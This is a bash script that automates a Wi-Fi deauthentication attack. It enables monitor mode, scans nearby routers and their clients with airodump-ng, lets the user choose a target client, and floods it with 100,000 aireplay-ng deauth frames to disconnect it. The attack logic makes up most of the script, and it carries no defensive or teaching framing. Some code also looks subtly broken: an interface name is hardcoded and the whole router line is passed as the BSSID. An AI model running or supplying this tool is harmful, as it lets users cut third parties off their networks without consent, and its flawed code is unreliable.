#!/usr/bin/env bash

### Progress-bar
progress_bar() {
  local current=$1
  local len=$2
  local bar_char=${4:-'|'}
  local bar_empty=${5:-' '}

  local perc_done=$((current * 100 / len))
  local -i width_terminal=$((COLUMNS - 2))
  local num_bars=$((perc_done * width_terminal / 100))

  local i
  local s='['
    for ((i = 0; i < num_bars; i++)); do s+=$bar_char; done
    for ((i = num_bars; i < width_terminal; i++)); do s+=$bar_empty; done
  s+=']'

  printf '\e7'                        # save the cursor location
  printf '\e[%d;1H' "$LINES"          # move cursor to the bottom
  printf '\e[0K'                      # clear the line
  printf '%s' "$s"                    # printf '%s' "$s ($perc_done%)"
  sleep .001
  printf '\e8'                        # restore the cursor location
}

### Init terminal
init_terminal() {
  (:)
  printf '\n'                         # ensure we have space for the scrollbar
  printf '\e7'                        # save the cursor location
  printf '\e[1;%dr' "$((LINES - 1))"  # set the scrollable region margin (1 to LINES-1)
  printf '\e8'                        # restore the cursor location
  printf '\e[1A'                      # move cursor up
}

### Clean terminal on exit
clean_terminal() {
  # kill "$PB_PID" 2>/dev/null
  # wait "$PB_PID" 2>/dev/null
  printf '\e[1;%dr' "$LINES"
  printf '\e[%d;1H' "$LINES"
  printf '\e[0K'
}

### Start loading
loading() {
  declare -i len=500
  while true; do
    for (( i = 0; i < len+1; i++ )); do
       progress_bar "$((i+1))" "$len" 1 ">"
       ((i++))
    done
  done
}

### Echo
process_echo() {
  local line
  while IFS= read -r line; do
    printf '\e7'
    printf '\e[%d;1H' "$((LINES - 1))"
    printf '%s\n' "$line"
    printf '\e8'
  done
}

### Check if packages are installed
check_packages() {
  packages=("iw" "airodump-ng" "aireplay-ng" "airmon-ng")
  for p in "${packages[@]}"; do
    if ! command -v "${p}" &> /dev/null
    then
      echo "Package ${p} must be installed!"
      exit 1
    fi
  done
}

### Get the list of wifi interfaces
get_interfaces() {
  mapfile -t interfaces < <(iw dev | awk '$1=="Interface" {print $2}')
  if [[ ${#interfaces[@]} -eq 0 ]]    #  this symbol --> #  is count
  then
    echo "No wireless interfaces available"
    exit 1
  fi
}

### Enable monitor mode
enable_monitor_mode() {
  interface="${interfaces[0]}"
  ifconfig "${interface}" down > /dev/null &&
  airmon-ng check kill > /dev/null &&
  iw dev "${interface}" set type monitor > /dev/null &&
  ifconfig "${interface}" up > /dev/null
}

scan_routers() {
  shopt -s nullglob
  rm routers*

  airodump-ng --band a "$interface" --write routers --write-interval 1 >/dev/null &
  local PID=$!

  echo "[+] Scanning network... PID: ${PID}" | process_echo
  sleep 10
  kill "$PID" 2>/dev/null
  wait "$PID" 2>/dev/null
  echo "[+] Scanning network DONE PID: ${PID}" | process_echo

  ### parsing SCV
  mapfile -t routers < <(
    sed -e '/^Station MAC/,$d' -e '/^BSSID/d' -e '/^$/d' -e 's/,/;/g' routers-01.csv |
    awk -F';' '{print $1, $4, $9, $(NF-1)}' |
    sed '/^[[:space:]]*$/d'
  )

  shopt -s nullglob
  rm routers*
}

select_router() {
  PS3='Select network: '
  COLUMNS=1
  select r in "${routers[@]}"; do
    router="${r}"
    break
  done
}

scan_router_clients() {
  shopt -s nullglob
  rm clients-*

  read -r mac channel _ name <<< "${router}"
  airodump-ng --bssid "$mac" --channel "$channel" --write clients --write-interval 1 >/dev/null "wlan0" &
  local PID=$!

  echo "[+] Scanning for clients on network '$mac $name'.' PID: $PID" | process_echo
  sleep 15
  kill "$PID" 2>/dev/null
  wait "$PID" 2>/dev/null
  echo "[+] Scanning clients DONE PID: ${PID}" | process_echo

  ### parsing SCV
  mapfile -t clients < <(
   sed -e '1,/^Station MAC/d' -e 's/,/;/g' clients-01.csv |
   awk -F';' '{print $1}' | 
   sed '/^[[:space:]]*$/d'
  )

  shopt -s nullglob
  rm clients-*
}

select_router_client() {
  PS3='Select client to disconect from network: '
  COLUMNS=1
  select c in "${clients[@]}"; do
    client="${c}"
    break
  done
}


main() {
 
  ### check
  check_packages
  get_interfaces

  trap clean_terminal EXIT SIGINT SIGTERM
  ### scan network routers
  init_terminal
  loading &
  PB_PID=$!
  enable_monitor_mode
  scan_routers
  kill "$PB_PID" 2>/dev/null
  wait "$PB_PID" 2>/dev/null
  clean_terminal
  select_router

  ### scan clients on network
  init_terminal
  loading &
  PB_PID=$!
  scan_router_clients
  kill "$PB_PID" 2>/dev/null
  wait "$PB_PID" 2>/dev/null
  clean_terminal
  
  ### Disconect client
  select_router_client
  airodump-ng --band a --bssid "$router" --channel "$channel" "$interface" &> /dev/null &
  local DUMP_PID=$!
  aireplay-ng --deauth 100000 -a "$router" -c "$client" -D "$interface" &> /dev/null &
  local PLAY_PID=$!
  echo "Client $client disconnected from network with process PLAY_PID: $PLAY_PID and DUMP_PID: $DUMP_PID" | process_echo
}

main
